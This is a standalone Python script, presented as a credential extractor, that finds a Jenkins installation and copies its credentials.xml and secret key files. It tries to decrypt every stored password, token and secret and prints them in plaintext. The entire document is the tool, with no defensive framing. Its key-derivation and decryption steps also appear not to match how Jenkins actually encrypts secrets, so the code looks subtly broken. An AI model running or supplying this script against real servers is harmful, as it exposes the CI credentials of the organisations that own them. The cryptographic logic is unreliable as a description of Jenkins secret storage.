pip3 install pycryptodome


import os
import shutil
import tempfile
import base64
import hashlib
import xml.etree.ElementTree as ET
from Crypto.Cipher import AES

def read_file(path):
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception as e:
        print(f"[-] Could not read file {path}: {e}")
        return None

def find_jenkins_home():
    jenkins_home = os.environ.get('JENKINS_HOME')
    if jenkins_home and os.path.isdir(jenkins_home):
        return jenkins_home

    common_paths = [
        '/var/lib/jenkins',
        os.path.expanduser('~/.jenkins'),
        '/usr/share/jenkins',
        '/usr/local/jenkins',
    ]
    for path in common_paths:
        if os.path.isdir(path):
            return path

    print("[-] Could not find Jenkins home directory automatically.")
    return None

def decrypt_secret(master_key_path, hudson_secret_path, encrypted_secret):
    master_key = read_file(master_key_path)
    hudson_secret = read_file(hudson_secret_path)
    if not master_key or not hudson_secret:
        return None

    key = hashlib.sha256(master_key + hudson_secret).digest()

    if encrypted_secret.startswith("{") and "}" in encrypted_secret:
        encrypted_secret = encrypted_secret.split("}", 1)[1]

    try:
        encrypted_bytes = base64.b64decode(encrypted_secret)
    except Exception as e:
        print(f"[-] Base64 decode error: {e}")
        return None

    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ciphertext)

    pad_len = decrypted[-1]
    if pad_len < 1 or pad_len > 16:
        print("[-] Invalid padding length detected.")
        return None

    decrypted = decrypted[:-pad_len]

    try:
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"[-] UTF-8 decode error: {e}")
        return None

def parse_credentials_xml(credentials_path, master_key_path, hudson_secret_path):
    try:
        tree = ET.parse(credentials_path)
        root = tree.getroot()
    except Exception as e:
        print(f"[-] Failed to parse {credentials_path}: {e}")
        return

    for cred in root.findall(".//com.cloudbees.plugins.credentials.impl.*"):
        cred_id = cred.find('id').text if cred.find('id') is not None else "N/A"
        description = cred.find('description').text if cred.find('description') is not None else "N/A"
        username = cred.find('username').text if cred.find('username') is not None else None

        print("="*60)
        print(f"Credential ID   : {cred_id}")
        print(f"Description     : {description}")
        if username:
            print(f"Username        : {username}")

        decrypted_fields = []
        for child in cred:
            tag = child.tag.lower()
            if 'password' in tag or 'secret' in tag or 'token' in tag:
                encrypted_value = child.text
                if encrypted_value:
                    decrypted = decrypt_secret(master_key_path, hudson_secret_path, encrypted_value)
                    if decrypted:
                        decrypted_fields.append((child.tag, decrypted))
                    else:
                        decrypted_fields.append((child.tag, "[Failed to decrypt]"))

        if decrypted_fields:
            print("Decrypted Secrets:")
            for field_name, value in decrypted_fields:
                print(f"  - {field_name}: {value}")
        else:
            print("No encrypted secrets found or decrypted.")

    print("="*60)

def copy_files_to_temp(jenkins_home):
    temp_dir = tempfile.mkdtemp(prefix="jenkins_creds_extract_")
    print(f"[+] Created temporary directory: {temp_dir}")

    files_to_copy = {
        'credentials.xml': os.path.join(jenkins_home, 'credentials.xml'),
        'master.key': os.path.join(jenkins_home, 'secrets', 'master.key'),
        'hudson.util.Secret': os.path.join(jenkins_home, 'secrets', 'hudson.util.Secret'),
    }

    for name, src_path in files_to_copy.items():
        if not os.path.isfile(src_path):
            print(f"[-] Required file not found or inaccessible: {src_path}")
            return None
        dst_path = os.path.join(temp_dir, name)
        try:
            shutil.copy2(src_path, dst_path)
        except Exception as e:
            print(f"[-] Failed to copy {src_path} to {dst_path}: {e}")
            return None

    return temp_dir

def main():
    jenkins_home = find_jenkins_home()
    if not jenkins_home:
        return

    print(f"[+] Jenkins home detected at: {jenkins_home}")

    temp_dir = copy_files_to_temp(jenkins_home)
    if not temp_dir:
        return

    credentials_path = os.path.join(temp_dir, 'credentials.xml')
    master_key_path = os.path.join(temp_dir, 'master.key')
    hudson_secret_path = os.path.join(temp_dir, 'hudson.util.Secret')

    parse_credentials_xml(credentials_path, master_key_path, hudson_secret_path)

    # Optional: clean up temp directory after use
    # shutil.rmtree(temp_dir)
    # print(f"[+] Temporary directory {temp_dir} removed.")

if __name__ == "__main__":
    main()
